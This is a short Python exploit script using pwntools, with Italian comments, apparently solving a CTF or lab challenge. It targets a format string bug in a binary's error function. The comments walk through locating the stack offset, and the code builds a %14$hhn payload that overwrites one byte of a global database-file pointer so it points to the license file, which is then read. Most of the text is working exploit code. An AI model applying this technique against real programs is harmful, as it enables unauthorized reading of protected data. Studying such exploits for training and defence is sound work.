from pwn import *
import sys

"""
Abbiamo una format string vulnerability.
Se non viene riconosciuto un comando, viene chiamata la 
funzione error. Questa funzione utilizza alla linea 125
fprinf con format string controllabile dall'attaccante. 

Un'altra cosa importante è che PIE non è abilitato. Possiamo
quindi sapere esattamente dove sia il return address per esempio
o comunque conoscere con esattezza la posizione di variabili globali

Per far sì che un attacco format string esprima il massimo, dobbiamo
indurre fprintf a fare cercare i suoi argomenti sullo stack, fino al
raggiungere la format string stessa. 

Con python3 -c 'print("AAAA" + "%p "*20)' si nota che 0x41414141 viene 
raggiunto dal 14 esimo %p. Confermato anche dalla stringa "AAAA%14$p", per
andare a prendersi direttamente il 14esimo argomento. 

Inoltre, i primi 4 byte per indurre la chiamata ad error, possono essere 
usati per inserire un indirizzo

L'idea è di far puntare il DB file sul license file e poi fare la find.
Conosciamo anche l'inizio della stringa della licenza da dare in pasto a grep

"""

"""
host = "localhost"
port = 10000
"""

dbfile = 0x0804e0ec
#dbfile_content = # 0xff835335
licensefile = 0x0804e0f0
#licensefile_content #0xff835329

# si può notare che solo un byte è diverso, l'ultimo 
# 0x29 = 41
buf = p32(dbfile) 
buf += b"A"*(41-4) + b"%14$hhn" + b"\n"
buf += b"FND Team\n"

sys.stdout.buffer.write(buf)